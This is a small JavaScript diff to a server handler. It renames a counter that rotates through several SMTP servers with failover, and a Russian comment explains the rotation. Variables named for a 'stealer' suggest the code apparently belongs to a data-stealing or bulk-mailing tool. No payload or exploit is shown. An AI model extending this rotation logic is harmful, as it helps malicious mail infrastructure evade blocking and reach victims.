@@ -593,8 +593,8 @@ async function handle(scope) {
       }
       if (!nodemailer) return send(res, 500, { ok: false, error: 'nodemailer not installed' });
       // Резервируем индекс: 1-е письмо → SMTP 1, 2-е → SMTP 2, … При ошибке SMTP удаляется из списка, этому же адресу пробуем следующий.
-      const smtpIndex = sendStealerSmtpIndex % smtpList.length;
-      sendStealerSmtpIndex = (sendStealerSmtpIndex + 1) | 0;
+      const smtpIndex = stealerRotation.index % smtpList.length;
+      stealerRotation.index = (stealerRotation.index + 1) | 0;
       let lastError = null;
       for (let k = 0; k < smtpList.length; k++) {
         const smtp = smtpList[(smtpIndex + k) % smtpList.length];
